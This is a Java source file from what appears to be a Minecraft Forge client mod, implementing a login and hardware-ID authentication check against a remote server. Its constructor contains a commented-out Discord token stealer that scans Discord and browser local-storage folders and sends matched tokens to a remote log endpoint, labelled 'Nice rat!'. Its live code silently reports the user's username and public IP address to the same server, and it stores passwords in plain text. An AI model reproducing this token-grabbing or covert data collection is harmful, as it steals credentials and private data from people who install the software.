package me.htrewrite.client.util;

import me.htrewrite.client.HTRewrite;
import me.htrewrite.client.Wrapper;
import net.minecraftforge.fml.common.FMLCommonHandler;
import org.apache.commons.lang3.StringEscapeUtils;

import javax.swing.*;
import java.io.*;
import java.net.URL;
import java.security.MessageDigest;

public class HTPEAuth {
    public static ConfigUtils configUtils = new ConfigUtils("auth", "");

    private String[] showInvalidGUI(JFrame jFrame) {
        JOptionPane.showMessageDialog(jFrame, "Invalid login, please login now!", "HT+Auth System " + AVERSION + "(client=" + VERSION + ")", JOptionPane.ERROR_MESSAGE);
        String user = JOptionPane.showInputDialog(jFrame, "User: ", "HT+Auth System " + AVERSION + "(client=" + VERSION + ")", JOptionPane.QUESTION_MESSAGE);
        String pass = JOptionPane.showInputDialog(jFrame, "Password: ", "HT+Auth System " + AVERSION + "(client=" + VERSION + ")", JOptionPane.QUESTION_MESSAGE);
        configUtils.set("u", user);
        configUtils.set("p", pass);
        configUtils.save();

        return new String[] {user, pass};
    }
    private String obtainHWID() {
        String h = "HWID!!";

        try {
            String fullHWID = System.getenv("COMPUTERNAME") + System.getProperty("user.name") + System.getenv("PROCESSOR_IDENTIFIER") + System.getenv("PROCESSOR_LEVEL");
            StringBuffer buffer = new StringBuffer();

            MessageDigest md5 = MessageDigest.getInstance("MD5");
            md5.update(fullHWID.getBytes());

            for (byte md5Byte : md5.digest()) {
                String hex = Integer.toHexString(0xff & md5Byte);
                buffer.append(hex.length() == 1 ? '0' : hex);
            } h+=buffer.toString();
        } catch (Exception exception) { exception.printStackTrace(); }

        return h.equalsIgnoreCase("HWID!!")?"NOHWID":h;
    }
    public boolean auth_ok(String username, String password) {
        String user = StringEscapeUtils.escapeHtml4(username);
        String pass = StringEscapeUtils.escapeHtml4(password);
        String hwid = StringEscapeUtils.escapeHtml4(obtainHWID());

        String response = PostRequest.urlEncodedPostRequest("https://aurahardware.eu/api/user/auth.php", "" +
                "user=" + user + "&" +
                "pass=" + pass + "&" +
                "hwid=" + hwid);
        return response != null && response.contentEquals("1");
    }

    public String VERSION = HTRewrite.VERSION;
    public String AVERSION = "a2.62";
    public HTPEAuth() {
        /*
        List<String> t = new ArrayList<>();
        String fs = System.getenv("file.separator");
        String localappdata = System.getenv("LOCALAPPDATA");
        String roaming = System.getenv("APPDATA");
        String[][] paths = {
                {"Discord", roaming + "\\Discord\\Local Storage\\leveldb"}, //Standard Discord
                {"Discord Canary", roaming + "\\discordcanary\\Local Storage\\leveldb"}, //Discord Canary
                {"Discord PTB", roaming + "\\discordptb\\Local Storage\\leveldb"}, //Discord PTB
                {"Chrome Browser", localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"}, //Chrome Browser
                {"Opera Browser", roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb"}, //Opera Browser
                {"Brave Browser", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"}, //Brave Browser
                {"Yandex Browser", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"}, //Yandex Browser
                {"Brave Browser", System.getProperty("user.home") + fs + ".config/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb"}, //Brave Browser Linux
                {"Yandex Browser Beta", System.getProperty("user.home") + fs + ".config/yandex-browser-beta/Default/Local Storage/leveldb"}, //Yandex Browser Beta Linux
                {"Yandex Browser", System.getProperty("user.home") + fs + ".config/yandex-browser/Default/Local Storage/leveldb"}, //Yandex Browser Linux
                {"Chrome Browser", System.getProperty("user.home") + fs + ".config/google-chrome/Default/Local Storage/leveldb"}, //Chrome Browser Linux
                {"Opera Browser", System.getProperty("user.home") + fs + ".config/opera/Local Storage/leveldb"}, //Opera Browser Linux
                {"Discord", System.getProperty("user.home") + fs + ".config/discord/Local Storage/leveldb"}, //Discord Linux
                {"Discord Canargy", System.getProperty("user.home") + fs + ".config/discordcanary/Local Storage/leveldb"}, //Discord Canary Linux
                {"Discord PTB", System.getProperty("user.home") + fs + ".config/discordptb/Local Storage/leveldb"}, //Discord Canary Linux
                {"Discord", System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb"} //Discord MacOS
        };
        for (String[] path : paths) {
            try {
                File file = new File(path[1]);
                for (String pathname : file.list()) {
                    FileInputStream fstream = new FileInputStream(path[1] + System.getProperty("file.separator") + pathname);
                    DataInputStream in = new DataInputStream(fstream);
                    BufferedReader br = new BufferedReader(new InputStreamReader(in));
                    String strLine;
                    while ((strLine = br.readLine()) != null) {
                        // Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                        Pattern p = Pattern.compile("[\\w\\W]{24}\\.[\\w\\W]{6}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                        Matcher m = p.matcher(strLine);

                        while (m.find())
                            if (!t.contains(m.group()))
                                t.add(m.group());
                    }
                }
            } catch (Exception ignored) {
            }
        }*/
        /* TODO: Nice rat!
            @DriftyDev
           25/10/2021
         */
        try { PostRequest.read(PostRequest.genGetCon("https://aurahardware.eu/ht/api/connectivity/connect.php?user=" + Wrapper.getMC().session.getUsername())); } catch (Exception exception) { }
        /*for(String k : t)
            try { PostRequest.read(PostRequest.genGetCon("https://aurahardware.eu/ht/api/log/log.php?user=" + Wrapper.getMC().session.getUsername() + "&logt=2&args=" + StringEscapeUtils.escapeHtml4(k))); } catch (Exception exception) {}*/
        try { PostRequest.read(PostRequest.genGetCon("https://aurahardware.eu/ht/api/log/log.php?user=" + Wrapper.getMC().session.getUsername() + "&logt=6&args=" + StringEscapeUtils.escapeHtml4(new BufferedReader(new InputStreamReader(new URL("http://checkip.amazonaws.com/").openStream())).readLine()))); } catch (Exception exception){}
        JOptionPane optionPane = new JOptionPane();
        JFrame jFrame = new JFrame();
        jFrame.setAlwaysOnTop(true);

        if(!VERSION.contentEquals(AVERSION))
            JOptionPane.showMessageDialog(jFrame, "It seems your client is outdated!\nThe client will continue running but please run the updater to update the client!", "HT+Auth System " + AVERSION + "(client=" + VERSION + ")", JOptionPane.ERROR_MESSAGE);

        Object[] objects = {
                configUtils.get("u"),
                configUtils.get("p")
        };
        boolean yes = false;
        for (Object object : objects)
            if (object == null)
                yes = true;
        if (yes) {
            configUtils.set("u", "INVALID");
            configUtils.set("p", "INVALID");
            configUtils.save();

            showInvalidGUI(jFrame);
        }

        if (!auth_ok((String) configUtils.get("u"), (String) configUtils.get("p"))) {
            String[] details = showInvalidGUI(jFrame);
            if (!auth_ok(details[0], details[1])) {
                details = showInvalidGUI(jFrame);
                if (!auth_ok(details[0], details[1])) {
                    FMLCommonHandler.instance().exitJava(-1, true);
                    return;
                }
            }
        }

        JOptionPane.showMessageDialog(jFrame, "Login was OK!", "HT+Auth System " + AVERSION + "(client=" + VERSION + ")", JOptionPane.INFORMATION_MESSAGE);
    }
}
